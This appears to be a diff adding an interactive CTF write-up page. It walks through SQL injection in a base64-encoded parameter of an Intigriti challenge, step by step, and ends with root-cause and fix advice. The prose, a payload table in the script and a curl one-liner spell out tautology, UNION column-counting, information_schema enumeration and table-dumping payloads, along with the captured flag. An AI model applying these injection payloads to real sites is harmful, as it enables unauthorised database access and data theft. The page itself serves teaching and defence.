+  <p class="prose reveal">If the name really ends up in a SQL <code>WHERE</code> clause, I can change what the query returns.
+    This payload closes the quote, adds <code>OR '1'='1'</code> (always true), and comments out the rest.
+    I asked for a critter called <code>x</code> — the page showed me the <b>fox</b>, the first row in the table.</p>
+
+  <div id="t3" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">what this step proved</span>
+    SQL injection confirmed — and the description box prints whatever the query returns. That box is about to become my output channel.</div>
+  <div class="next reveal"><a class="btn ghost" href="#s4">Step 04 — UNION →</a></div>
+</section>
+
+<!-- ================= STEP 4 ================= -->
+<section class="sec" id="s4">
+  <div class="sec-head reveal">
+    <div class="num">04</div>
+    <div><div class="kick">UNION calibration</div><h2>How many columns?</h2></div>
+  </div>
+  <p class="prose reveal"><code>UNION SELECT</code> appends my own row to the query's result, but the column count has to match
+    the original query. So I swept it: <code>UNION SELECT '1'</code>, then <code>'1','2'</code>, and so on. The number of columns
+    I can inject shows up right in the description box.</p>
+  <p class="prose reveal">Here only <b>one column</b> works. Everything else crashes the query. One is all I need.</p>
+
+  <div id="t4" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">what this step proved</span>
+    The query returns a single column and renders it back to me. <code>version()</code> says MySQL 8.0.46.</div>
+  <div class="next reveal"><a class="btn ghost" href="#s5">Step 05 — mapping the database →</a></div>
+</section>
+
+<!-- ================= STEP 5 ================= -->
+<section class="sec" id="s5">
+  <div class="sec-head reveal">
+    <div class="num">05</div>
+    <div><div class="kick">Enumeration</div><h2>Mapping the database</h2></div>
+  </div>
+  <p class="prose reveal">MySQL keeps a catalog of itself in <code>information_schema</code>, readable by default.
+    With <code>GROUP_CONCAT</code> I can pull whole lists in a single request instead of one value at a time.
+    Three questions: which database, which tables, which columns.</p>
+
+  <div id="t5" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">what this step proved</span>
+    Two tables: <code>animals</code> (the gallery data) and <code>secret_vault</code> with columns <code>id</code> and <code>note</code>. Not subtle. 👀</div>
+  <div class="next reveal"><a class="btn ghost" href="#s6">Step 06 — the flag →</a></div>
+</section>
+
+<!-- ================= STEP 6 ================= -->
+<section class="sec" id="s6">
+  <div class="sec-head reveal">
+    <div class="num">06</div>
+    <div><div class="kick">Extraction</div><h2>Opening the secret_vault</h2></div>
+  </div>
+  <p class="prose reveal">One injectable column, one target table. Pick what the query should answer below and send it —
+    the last option is the one that ends the CTF.</p>
+
+  <div class="play gcard reveal" style="margin-top:26px">
+    <div class="play-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+      <span class="play-title">PAYLOAD BUILDER — what should the query say?</span></div>
+    <div class="play-body">
+      <div class="presets" id="builderPills" style="gap:8px">
+        <button class="pill" data-k="ver">version()</button>
+        <button class="pill" data-k="db">database name</button>
+        <button class="pill" data-k="tables">all tables</button>
+        <button class="pill" data-k="cols">vault columns</button>
+        <button class="pill star" data-k="note">⭐ dump secret_vault.note</button>
+      </div>
+      <div class="field"><label>PAYLOAD (decoded — gets base64'd into ?pic= automatically)</label>
+        <textarea id="builderPayload" rows="2" spellcheck="false"></textarea></div>
+    </div>
+  </div>
+
+  <div id="t6" class="reveal"></div>
+
+  <div class="take reveal"><span class="tk">the whole solve in one line</span>
+    <span class="oneliner" style="display:block;margin-top:8px"><code>curl -s "https://challenge-0926.challenges.intigriti.io/challenge.php?pic=$(printf "%s" "zzz' UNION SELECT note FROM secret_vault -- -" | base64 -w0)" | grep -o 'INTIGRITI{[^}]*}'</code></span>
+  </div>
+  <div class="next reveal"><a class="btn ghost" href="#s7">Step 07 — why it worked →</a></div>
+</section>
+
+<!-- ================= STEP 7 ================= -->
+<section class="sec" id="s7">
+  <div class="sec-head reveal">
+    <div class="num">07</div>
+    <div><div class="kick">Root cause</div><h2>Why it worked, and the fix</h2></div>
+  </div>
+  <p class="prose reveal">The bug is one line: the decoded value was concatenated straight into the query.
+    Base64 looked like a defense but wasn't one — decode is not sanitize. A prepared statement makes the whole thing impossible:</p>
+
+  <div class="code2 reveal">
+    <div class="codebox vuln gcard">
+      <div class="cb-bar">✕ the bug (reconstructed)</div>
+      <pre><span class="cm">// challenge.php</span>
+$name = <span class="str">base64_decode</span>($_GET['pic']);
+
+<span class="bad-line">$sql = "SELECT description FROM animals
+        WHERE name = '" . $name . "'";</span>
+<span class="cm">// decoded ≠ safe. 💥</span></pre>
+    </div>
+    <div class="codebox fixed gcard">
+      <div class="cb-bar">✓ the fix</div>
+      <pre><span class="good-line">$stmt = $pdo->prepare(
+  "SELECT description FROM animals
+   WHERE name = ?");</span>
+$stmt->execute([
+  <span class="str">base64_decode</span>($_GET['pic'])
+]);
+<span class="cm">// + allow-list the 8 critter names
+// + generic error page instead of blank 200</span></pre>
+    </div>
+  </div>
+
+  <div class="cards reveal">
+    <div class="card"><div class="ci">🛡️</div><h4>Prepared statements</h4><p>Data stays data. No quote can change the shape of the query.</p></div>
+    <div class="card"><div class="ci">✅</div><h4>Allow-list</h4><p>Eight critters exist — accept those eight names, reject everything else.</p></div>
+    <div class="card"><div class="ci">🔒</div><h4>Fail properly</h4><p>The blank 200 page was a free error oracle. Return a generic error, log the details.</p></div>
+    <div class="card"><div class="ci">🤫</div><h4>Less fingerprints</h4><p><code>X-Powered-By: PHP/8.2.33</code> tells attackers the stack for free.</p></div>
+  </div>
+
+  <div class="take reveal"><span class="tk">submission summary</span>
+    Flag <code>INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</code> · payload
+    <code>zzz' UNION SELECT note FROM secret_vault -- -</code> (base64'd into <code>?pic=</code>) ·
+    recon → quote parity → tautology → 1-column UNION → information_schema → dump <code>secret_vault.note</code>.</div>
+</section>
+
+</main>
+
+<footer>
+  <div class="big">🐾 solved by <a href="https://github.com/RYD3R-0" target="_blank" rel="noopener">RYD3R-0</a></div>
+  write-up + interactive page: github.com/RYD3R-0 · challenge by <a href="https://x.com/khanhdlq" target="_blank" rel="noopener">@khanhdlq</a> for the Intigriti September 2026 CTF<br>
+  every response on this page was captured from the live challenge on 25 Sep 2026 — the page keeps working after the CTF ends<br>
+  learned something? test only where you have permission.
+</footer>
+
+</div>
+
+<!-- flag modal -->
+<div class="modal" id="flagModal">
+  <div class="box gcard">
+    <button class="x" id="modalX">✕</button>
+    <div class="fk">— SECRET_VAULT.NOTE —</div>
+    <h3>Flag captured 🚩</h3>
+    <div class="fp" id="modalFlag">INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}</div>
+    <div class="row">
+      <button class="btn primary" id="copyFlag">Copy flag</button>
+      <a class="btn ghost" href="#s7">See why it worked →</a>
+    </div>
+  </div>
+</div>
+
+<script>
+/* =====================================================================
+   DATA — payloads & real responses captured from the live challenge
+===================================================================== */
+const HOST = "challenge-0926.challenges.intigriti.io";
+const FLAG = "INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}";
+
+const P = {
+  fox:     "fox",
+  inj:     "<h1>injected</h1>",
+  q1:      "fox'",
+  q2:      "fox''",
+  q3:      "fox'''",
+  dq:      'fox"',
+  or1:     "x' OR '1'='1' -- ",
+  ver:     "zzz' UNION SELECT version() -- -",
+  db:      "zzz' UNION SELECT DATABASE() -- -",
+  tables:  "zzz' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() -- -",
+  cols:    "zzz' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='secret_vault' -- -",
+  note:    "zzz' UNION SELECT note FROM secret_vault -- -",
+};
+P.u = n => `zzz' UNION SELECT ${Array.from({length:n},(_,i)=>`'${i+1}'`).join(",")} -- -`;
+
+const esc = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+function rawCard({art="🖼️", h2, mark}) {
+  const h2e = esc(h2);
+  return `<section class="detail">\n  <div class="art">${art}</div>\n  <div>\n    <h2>${h2e}</h2>\n    <div class="desc">${mark ? `<mark>${esc(mark)}</mark>` : ""}</div>\n  </div>\n</section>`;
+}
+
+const HEADERS = [
+  ["content-type","text/html; charset=UTF-8"],
+  ["x-powered-by","PHP/8.2.33"],
+  ["server","istio-envoy"],
+];
+
+const R = (o) => Object.assign({status:"200 OK", meta:"HTTP/2 · 3 ms · 4.1 KB", headers:HEADERS, empty:false, card:null, raw:null, note:""}, o);
+
+const DEMOS = {
+  fox: R({ meta:"HTTP/2 · 3 ms · 4.1 KB", card:{art:"🦊",name:"fox",desc:"The red fox is a clever, highly adaptable hunter."},
+    raw:rawCard({art:"🦊",h2:"fox",mark:"The red fox is a clever, highly adaptable hunter."}),
+    note:"A name the server knows → it fetches the row and prints the description. Keep that description box in mind." }),
+  inj: R({ card:{art:"🖼️",name:"<h1>injected</h1>",desc:"No critter goes by that name yet.",bad:true},
+    raw:rawCard({h2:"<h1>injected</h1>",mark:"No critter goes by that name yet."}),
+    note:"My text comes back encoded (<code>&amp;lt;h1&amp;gt;</code>) — no XSS here. But unknown names get their own message, so the value is processed server-side before that." }),
+  q1: R({ meta:"HTTP/2 · 3 ms · 0 B body", empty:true,
+    note:"Empty 200. The quote broke a SQL query and PHP died silently. That's our oracle." }),
+  q2: R({ card:{art:"🖼️",name:"fox''",desc:"No critter goes by that name yet.",bad:true},
+    raw:rawCard({h2:"fox''",mark:"No critter goes by that name yet."}),
+    note:"Two quotes = balanced = valid SQL string. Page loads fine. So my input sits inside a SQL literal." }),
+  q3: R({ meta:"HTTP/2 · 3 ms · 0 B body", empty:true, note:"Odd number of quotes again → same silent crash." }),
+  dq: R({ card:{art:"🖼️",name:'fox"',desc:"No critter goes by that name yet.",bad:true},
+    raw:rawCard({h2:'fox"',mark:"No critter goes by that name yet."}),
+    note:"Double quote is harmless, so the query wraps the value in single quotes. Payload grammar decided." }),
+  or1: R({ card:{art:"🦊",name:"x' OR '1'='1' -- ",desc:"The red fox is a clever, highly adaptable hunter.",bad:true},
+    raw:rawCard({h2:"x' OR '1'='1' -- ",mark:"The red fox is a clever, highly adaptable hunter."}),
+    note:"I asked for x, I got the fox. OR '1'='1' matched the first row — my text is executing inside the WHERE clause." }),
+  u1: R({ card:{art:"🖼️",name:P.u(1),desc:"1",bad:true},
+    raw:rawCard({h2:P.u(1),mark:"1"}),
+    note:"One column. My '1' came back in the description slot — the query returns a single field." }),
+  uN: R({ meta:"HTTP/2 · 3 ms · 0 B body", empty:true, note:"Column count mismatch → UNION fails → same silent crash." }),
+  ver: R({ card:{art:"🖼️",name:P.ver,desc:"8.0.46",bad:true},
+    raw:rawCard({h2:P.ver,mark:"8.0.46"}),
+    note:"MySQL 8.0.46. From here on, the description box prints whatever I SELECT." }),
+  db: R({ card:{art:"🖼️",name:P.db,desc:"critter_gallery",bad:true},
+    raw:rawCard({h2:P.db,mark:"critter_gallery"}),
+    note:"Database name: critter_gallery." }),
+  tables: R({ card:{art:"🖼️",name:P.tables,desc:"animals,secret_vault",bad:true},
+    raw:rawCard({h2:P.tables,mark:"animals,secret_vault"}),
+    note:"Two tables: animals (the gallery) and secret_vault. 👀" }),
+  cols: R({ card:{art:"🖼️",name:P.cols,desc:"id,note",bad:true},
+    raw:rawCard({h2:P.cols,mark:"id,note"}),
+    note:"secret_vault has id and note. One query left." }),
+  note: R({ card:{art:"🏆",name:P.note,desc:FLAG,bad:false,win:true},
+    raw:rawCard({art:"🏆",h2:P.note,mark:FLAG}),
+    note:"The vault prints its note — the flag. CTF done. 🎉", flag:true }),
+};
+
+/* =====================================================================
+   TERMINAL ENGINE
+===================================================================== */
+function b64(s){ return btoa(s); }
+
+function buildTerminal(mountId, opts){
+  const root = document.getElementById(mountId);
+  root.innerHTML = `
+  <div class="rr gcard">
+    <div class="t-side req">
+      <div class="t-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span>
+        <span class="t-title">REQUEST</span><span class="t-live">● replaying</span>
+        <button class="t-send">▶ SEND</button></div>
+      <div class="t-body">
+        <div class="t-line"><span class="k">GET</span> /challenge.php?pic=<span class="b64v b64"></span> <span class="k">HTTP/2</span></div>
+        <div class="t-line"><span class="hdr-k">host:</span> ${HOST}</div>
+        <div class="t-line"><span class="hdr-k">user-agent:</span> <span class="dim">critter-detective/1.0</span></div>
+        <div class="t-dec"><span class="dl">↳ server-side · base64_decode( pic )</span><code class="dec"></code></div>
+        <div class="t-sql"><span class="sl">⚡ reconstructed query · MySQL</span>SELECT description FROM animals WHERE name = '<span class="pay q"></span>'</div>
+      </div>
+      ${opts.tools ? `<div class="t-tools"></div>` : ""}
+    </div>
+    <div class="t-side res">
+      <div class="t-bar"><span class="t-title" style="margin-left:0">RESPONSE</span></div>
+      <div class="t-body">
+        <div class="res-status"></div>
+        <div class="res-headers"></div>
+        <div class="res-card"><div class="m-art"></div><div><div class="m-name"></div><div class="m-desc"></div></div></div>
+        <div class="res-raw"><span class="rl">raw html · detail section</span><pre></pre></div>
+        <div class="res-empty">∅ &nbsp;empty response body — 0 bytes</div>
+        <div class="res-note"><span class="nk">what just happened</span><span class="nt"></span></div>
+      </div>
+    </div>
+    <div class="rr-hint">replay · real response captured from the live CTF (2026-09-25) · press ${opts.autoSend ? "a pill or " : ""}SEND to run</div>
+  </div>`;
+
+  const $ = s => root.querySelector(s);
+  const els = {
+    send: $(".t-send"), live: $(".t-live"), b64: $(".b64"), dec: $(".dec"), q: $(".q"),
+    status: $(".res-status"), headers: $(".res-headers"), card: $(".res-card"),
+    raw: $(".res-raw"), empty: $(".res-empty"), note: $(".res-note"),
+    decBox: $(".t-dec"), sql: $(".t-sql"), tools: $(".t-tools"),
+  };
+  const timers = [];
+  const later = (fn,t)=>timers.push(setTimeout(fn,t));
+  let current = null;
+
+  function clearPanel(){
+    timers.forEach(clearTimeout); timers.length = 0;
+    root.querySelectorAll(".t-line,.res-status,.res-card,.res-raw,.res-empty,.res-note,.t-dec,.t-sql").forEach(e=>e.classList.remove("in"));
+    els.status.innerHTML=""; els.headers.innerHTML=""; els.raw.querySelector("pre").innerHTML="";
+    els.dec.textContent=""; els.b64.textContent="";
+    els.card.classList.remove("show","in");
+    els.note.querySelector(".nt").innerHTML="";
+  }
+
+  function typeInto(el, text, speed=14, done){
+    let i=0;
+    (function tick(){
+      i = Math.min(text.length, i + 2);
+      el.textContent = text.slice(0,i);
+      if(i < text.length) timers.push(setTimeout(tick, speed));
+      else if(done) done();
+    })();
+  }
+
+  function send(demoKey, silent){
+    const d = DEMOS[demoKey]; if(!d) return;
+    current = demoKey;
+    const plain = P[demoKey] !== undefined ? P[demoKey] : demoKey;
+    clearPanel();
+    els.send.disabled = true; els.send.textContent = "… sending";
+    els.live.classList.add("blink");
+
+    const B = b64(plain);
+    later(()=>{ els.b64.textContent = B; root.querySelector(".t-line").classList.add("in"); }, 80);
+    later(()=>root.querySelectorAll(".t-side.req .t-line")[1].classList.add("in"), 260);
+    later(()=>root.querySelectorAll(".t-side.req .t-line")[2].classList.add("in"), 400);
+    later(()=>{ els.decBox.classList.add("in"); typeInto(els.dec, plain, 12); }, 620);
+    later(()=>{ els.sql.classList.add("in"); els.q.textContent = plain; }, 620 + plain.length*7 + 350);
+
+    const T = 620 + plain.length*7 + 900;
+    later(()=>{
+      els.live.classList.remove("blink");
+      els.status.innerHTML = `<span class="st-ok">${d.status}</span> &nbsp;<span class="st-meta">${d.meta}</span>`;
+      els.status.classList.add("in");
+    }, T);
+    d.headers.forEach((h,i)=>{
+      later(()=>{
+        const div = document.createElement("div");
+        div.className = "t-line in";
+        div.innerHTML = `<span class="hdr-k">${h[0]}:</span> <span class="dim">${h[1]}</span>`;
+        els.headers.appendChild(div);
+      }, T + 120 + i*110);
+    });
+
+    const T2 = T + 120 + d.headers.length*110 + 160;
+    if(d.empty){
+      later(()=>els.empty.classList.add("in"), T2);
+    } else {
+      later(()=>{
+        els.card.classList.add("show");
+        requestAnimationFrame(()=>els.card.classList.add("in"));
+        $(".m-art").textContent = d.card.art;
+        const nm = $(".m-name"); nm.textContent = d.card.name;
+        nm.classList.toggle("bad", !!d.card.bad); nm.classList.toggle("win", !!d.card.win);
+        $(".m-desc").textContent = d.card.desc;
+      }, T2);
+      later(()=>{
+        els.raw.querySelector("pre").innerHTML = d.raw;
+        els.raw.classList.add("in");
+      }, T2 + 220);
+    }
+    later(()=>{
+      els.note.querySelector(".nt").innerHTML = d.note;
+      els.note.classList.add("in");
+      els.send.disabled = false; els.send.textContent = "↻ replay"; els.send.classList.add("replay");
+      if(d.flag && !silent) celebrate();
+    }, T2 + (d.empty?200:520));
+  }
+
+  els.send.addEventListener("click", ()=>send(current || opts.defaultDemo));
+  return { root, els, send };
+}
+
+/* =====================================================================
+   MOUNT THE TERMINALS — intro replay plays when scrolled into view
+===================================================================== */
+const T1 = buildTerminal("t1", {defaultDemo:"fox"});
+
+const T2 = buildTerminal("t2", {defaultDemo:"q1", tools:true});
+{
+  const tools = T2.els.tools;
+  const defs = [["q1","fox' · odd","danger"],["q2","fox'' · even","good"],["q3","fox''' · odd","danger"],["dq",'fox" · double',""]];
+  defs.forEach(([k,label,cls])=>{
+    const b = document.createElement("button");
+    b.className = "pill " + (cls||""); b.textContent = label;
+    b.addEventListener("click", ()=>{ tools.querySelectorAll(".pill").forEach(p=>p.classList.remove("on")); b.classList.add("on"); T2.send(k); });
+    tools.appendChild(b);
+  });
+}
+
+const T3 = buildTerminal("t3", {defaultDemo:"or1"});
+
+const T4 = buildTerminal("t4", {defaultDemo:"u1", tools:true});
+{
+  const tools = T4.els.tools;
+  for(let n=1;n<=6;n++){
+    const k = "u"+n;
+    P[k] = P.u(n);
+    DEMOS[k] = n===1 ? DEMOS.u1 : Object.assign({}, DEMOS.uN, {note:`${n} columns → mismatch → same silent crash.`});
+    const b = document.createElement("button");
+    b.className = "pill " + (n===1?"good":"danger"); b.textContent = n + (n===1?" ✓":"");
+    b.addEventListener("click", ()=>{ tools.querySelectorAll(".pill").forEach(p=>p.classList.remove("on")); b.classList.add("on"); T4.send(k); });
+    tools.appendChild(b);
+  }
+  const ver = document.createElement("button");
+  ver.className = "pill"; ver.textContent = "…then version()";
+  ver.addEventListener("click", ()=>{ tools.querySelectorAll(".pill").forEach(p=>p.classList.remove("on")); ver.classList.add("on"); T4.send("ver"); });
+  tools.appendChild(ver);
+}
+
+const T5 = buildTerminal("t5", {defaultDemo:"db", tools:true});
+{
+  const tools = T5.els.tools;
+  [["db","1 · database"],["tables","2 · tables"],["cols","3 · columns"]].forEach(([k,label])=>{
+    const b = document.createElement("button");
+    b.className = "pill"; b.textContent = label;
+    b.addEventListener("click", ()=>{ tools.querySelectorAll(".pill").forEach(p=>p.classList.remove("on")); b.classList.add("on"); T5.send(k); });
+    tools.appendChild(b);
+  });
+}
+
+const T6 = buildTerminal("t6", {defaultDemo:"note"});
+const BUILDER = [
+  ["ver",  P.ver],
+  ["db",   P.db],
+  ["tables",P.tables],
+  ["cols", P.cols],
+  ["note", P.note],
+];
+function setBuilder(k){
+  const item = BUILDER.find(x=>x[0]===k);
+  document.getElementById("builderPayload").value = item[1];
+  document.querySelectorAll("#builderPills .pill").forEach(p=>p.classList.toggle("on", p.dataset.k===k));
+}
+document.querySelectorAll("#builderPills .pill").forEach(p=>p.addEventListener("click", ()=>{ setBuilder(p.dataset.k); T6.send(p.dataset.k); }));
+document.getElementById("builderPayload").addEventListener("change", e=>{
+  P.custom = e.target.value.trim();
+  DEMOS.custom = Object.assign({}, DEMOS.note, {card:Object.assign({},DEMOS.note.card,{name:P.custom}), raw:rawCard({art:"🏆",h2:P.custom,mark:FLAG}), flag:false});
+  T6.send("custom");
+});
+setBuilder("note");
+
+function lazyStart(term, key){
+  const io = new IntersectionObserver(es=>{
+    es.forEach(e=>{ if(e.isIntersecting){ io.disconnect(); term.send(key, true); }});
+  },{threshold:.25});
+  io.observe(term.root);
+}
+lazyStart(T1,"fox"); lazyStart(T2,"q1"); lazyStart(T3,"or1"); lazyStart(T4,"u1"); lazyStart(T5,"db");
+
+/* hero flag chip */
+document.getElementById("heroFlag").addEventListener("click", function(){ this.classList.toggle("open"); });
+
+/* modal + confetti + toast */
+const modal = document.getElementById("flagModal");
+function celebrate(){
+  modal.classList.add("open");
+  burst(window.innerWidth/2, window.innerHeight/2.2);
+  burst(window.innerWidth/2 - 140, window.innerHeight/2.6);
+  burst(window.innerWidth/2 + 140, window.innerHeight/2.6);
+}
+document.getElementById("modalX").addEventListener("click", ()=>modal.classList.remove("open"));
+modal.addEventListener("click", e=>{ if(e.target===modal) modal.classList.remove("open"); });
+document.getElementById("copyFlag").addEventListener("click", async ()=>{
+  try{ await navigator.clipboard.writeText(FLAG); toast("flag copied ✓"); }
+  catch{ toast("select & copy the flag manually"); }
+});
+document.getElementById("modalFlag").textContent = FLAG;
+
+let toastT;
+function toast(msg){
+  const t = document.getElementById("toast");
+  t.textContent = msg; t.classList.add("show");
+  clearTimeout(toastT); toastT = setTimeout(()=>t.classList.remove("show"), 2200);
+}
+
+/* confetti */
+const cvs = document.getElementById("confetti"), ctx = cvs.getContext("2d");
+function fit(){ cvs.width = innerWidth * devicePixelRatio; cvs.height = innerHeight * devicePixelRatio; ctx.setTransform(devicePixelRatio,0,0,devicePixelRatio,0,0); }
+fit(); addEventListener("resize", fit);
+let parts = [], raf = null;
+const COLORS = ["#8b9dff","#ff8bd0","#6ee7a0","#ffd166","#ffffff","#b3c0ff"];
+function burst(x,y){
+  for(let i=0;i<110;i++){
+    const a = Math.random()*Math.PI*2, v = 3+Math.random()*8;
+    parts.push({x,y,vx:Math.cos(a)*v,vy:Math.sin(a)*v-4,g:.18,w:4+Math.random()*6,h:3+Math.random()*4,
+      r:Math.random()*Math.PI,vr:(Math.random()-.5)*.3,c:COLORS[i%COLORS.length],life:90+Math.random()*40});
+  }
+  if(!raf) raf = requestAnimationFrame(step);
+}
+function step(){
+  ctx.clearRect(0,0,innerWidth,innerHeight);
+  parts = parts.filter(p=>p.life>0);
+  for(const p of parts){
+    p.x+=p.vx; p.y+=p.vy; p.vy+=p.g; p.vx*=.985; p.r+=p.vr; p.life--;
+    ctx.save(); ctx.translate(p.x,p.y); ctx.rotate(p.r);
+    ctx.globalAlpha = Math.min(1,p.life/40); ctx.fillStyle = p.c;
+    ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h); ctx.restore();
+  }
+  raf = parts.length ? requestAnimationFrame(step) : (ctx.clearRect(0,0,innerWidth,innerHeight), null);
+}
+
+/* =====================================================================
+   SCROLL: progress bar, scrollspy, reveal
+===================================================================== */
+const bar = document.getElementById("progress");
+addEventListener("scroll", ()=>{
+  const h = document.documentElement;
+  bar.style.width = (h.scrollTop/(h.scrollHeight-h.clientHeight)*100) + "%";
+}, {passive:true});
+
+const chips = [...document.querySelectorAll("nav a.chip")];
+const spy = new IntersectionObserver(es=>{
+  es.forEach(e=>{ if(e.isIntersecting){
+    chips.forEach(c=>c.classList.toggle("on", c.getAttribute("href")==="#"+e.target.id));
+  }});
+},{rootMargin:"-35% 0px -55% 0px"});
+document.querySelectorAll("main .sec").forEach(s=>spy.observe(s));
+
+const rev = new IntersectionObserver(es=>{
+  es.forEach(e=>{ if(e.isIntersecting){ e.target.classList.add("in"); rev.unobserve(e.target); }});
+},{threshold:.12});
+document.querySelectorAll(".reveal").forEach(e=>rev.observe(e));
+
+/* base64 playground */
+const bi = document.getElementById("b64in"), bo = document.getElementById("b64out");
+function runB64(){
+  const v = bi.value;
+  try { bo.value = btoa(unescape(encodeURIComponent(v))); } catch { bo.value = "(non-ASCII)"; }
+}
+bi.addEventListener("input", runB64);
+document.querySelectorAll("[data-b64]").forEach(b=>b.addEventListener("click", ()=>{ bi.value = b.dataset.b64; runB64(); }));
+runB64();
+</script>
+
+<script type="importmap">
+{ "imports": {
+    "three": "https://unpkg.com/three@0.160.0/build/three.module.js",
+    "three/addons/": "https://unpkg.com/three@0.160.0/examples/jsm/"
+} }
+</script>
+<script type="module">
+try {
+  const THREE = await import("three");
+  const { RoomEnvironment } = await import("three/addons/environments/RoomEnvironment.js");
+
+  const canvas = document.getElementById("bg3d");
+  const renderer = new THREE.WebGLRenderer({canvas, alpha:true, antialias:true});
+  renderer.setPixelRatio(Math.min(devicePixelRatio, 2));
+  renderer.setSize(innerWidth, innerHeight);
+  renderer.toneMapping = THREE.ACESFilmicToneMapping;
+
+  const scene = new THREE.Scene();
+  const pmrem = new THREE.PMREMGenerator(renderer);
+  scene.environment = pmrem.fromScene(new RoomEnvironment(), 0.04).texture;
+
+  const camera = new THREE.PerspectiveCamera(50, innerWidth/innerHeight, .1, 100);
+  camera.position.set(0, 0, 9);
+
+  const g = new THREE.Group();
+  scene.add(g);
+
+  /* hero glass shard */
+  const glass = new THREE.Mesh(
+    new THREE.IcosahedronGeometry(1.75, 0),
+    new THREE.MeshPhysicalMaterial({
+      color:0x9db4ff, metalness:0, roughness:.06, transmission:1, thickness:1.6,
+      ior:1.45, clearcoat:1, clearcoatRoughness:.08,
+      attenuationDistance:4.5, attenuationColor:0xff8bd0
+    })
+  );
+  glass.position.set(3.4, .3, -1.2);
+  g.add(glass);
+
+  const wire = new THREE.Mesh(
+    new THREE.IcosahedronGeometry(2.05, 1),
+    new THREE.MeshBasicMaterial({color:0x8b9dff, wireframe:true, transparent:true, opacity:.16})
+  );
+  wire.position.copy(glass.position);
+  g.add(wire);
+
+  /* chrome knot */
+  const knot = new THREE.Mesh(
+    new THREE.TorusKnotGeometry(.55, .17, 160, 24),
+    new THREE.MeshStandardMaterial({color:0x8fa3ff, metalness:1, roughness:.16})
+  );
+  knot.position.set(-3.9, 1.9, -2.4);
+  g.add(knot);
+
+  /* pink glass octa */
+  const octa = new THREE.Mesh(
+    new THREE.OctahedronGeometry(.85, 0),
+    new THREE.MeshPhysicalMaterial({
+      color:0xffc2e5, metalness:0, roughness:.1, transmission:.95, thickness:1.1,
+      ior:1.4, clearcoat:1, attenuationColor:0x8b9dff
+    })
+  );
+  octa.position.set(-3.1, -1.9, -1.6);
+  g.add(octa);
+
+  /* small satellites */
+  const satMat = new THREE.MeshStandardMaterial({color:0x2c3170, metalness:.85, roughness:.3});
+  [[1.9,-2.6,-1, .3],[-1.2,2.6,-2, .42],[5.4,-2.1,-3, .5],[-5.6,.4,-3.4, .36]].forEach(([x,y,z,r])=>{
+    const s = new THREE.Mesh(new THREE.IcosahedronGeometry(r, 0), satMat);
+    s.position.set(x,y,z); g.add(s);
+  });
+
+  /* starfield */
+  const mkStars = (n, size, color, spread) => {
+    const pos = new Float32Array(n*3);
+    for(let i=0;i<n*3;i++) pos[i] = (Math.random()-.5)*spread;
+    const geo = new THREE.BufferGeometry();
+    geo.setAttribute("position", new THREE.BufferAttribute(pos,3));
+    return new THREE.Points(geo, new THREE.PointsMaterial({size, color, transparent:true, opacity:.75}));
+  };
+  const stars1 = mkStars(700, .04, 0x8fa3ff, 40);
+  const stars2 = mkStars(300, .06, 0xff8bd0, 34);
+  g.add(stars1, stars2);
+
+  /* interaction: mouse parallax + drag to spin */
+  let mx=0, my=0, vx=0, vy=0, dragging=false, px=0, py=0;
+  addEventListener("pointermove", e=>{
+    mx = (e.clientX/innerWidth - .5); my = (e.clientY/innerHeight - .5);
+    if(dragging){ vx += (e.clientX-px)*.00035; vy += (e.clientY-py)*.00035; px=e.clientX; py=e.clientY; }
+  });
+  addEventListener("pointerdown", e=>{
+    if(e.target.closest("button,a,input,textarea,pre,select,.rr,.play,.modal,nav")) return;
+    dragging = true; px = e.clientX; py = e.clientY;
+  });
+  addEventListener("pointerup", ()=>dragging=false);
+
+  addEventListener("resize", ()=>{
+    camera.aspect = innerWidth/innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(innerWidth, innerHeight);
+  });
+
+  const clock = new THREE.Clock();
+  const reduced = matchMedia("(prefers-reduced-motion: reduce)").matches;
+  (function loop(){
+    requestAnimationFrame(loop);
+    if(document.hidden) return;
+    const t = clock.getElapsedTime();
+    if(!reduced){
+      glass.rotation.x = t*.12; glass.rotation.y = t*.16;
+      wire.rotation.x = -t*.07; wire.rotation.y = -t*.09;
+      knot.rotation.x = t*.2;  knot.rotation.y = t*.26;
+      octa.rotation.y = t*.3;  octa.rotation.z = t*.12;
+      stars1.rotation.y = t*.008; stars2.rotation.y = -t*.011;
+    }
+    /* drag velocity + damping */
+    g.rotation.y += vx; g.rotation.x += vy;
+    vx *= .94; vy *= .94;
+    /* parallax + scroll drift */
+    camera.position.x += (mx*1.1 - camera.position.x)*.03;
+    camera.position.y = -my*.7 - scrollY*.0012;
+    camera.lookAt(0,0,0);
+    renderer.render(scene, camera);
+  })();
+} catch(err){
+  console.warn("3D layer disabled:", err);
+}
+</script>
+</body>
+</html>
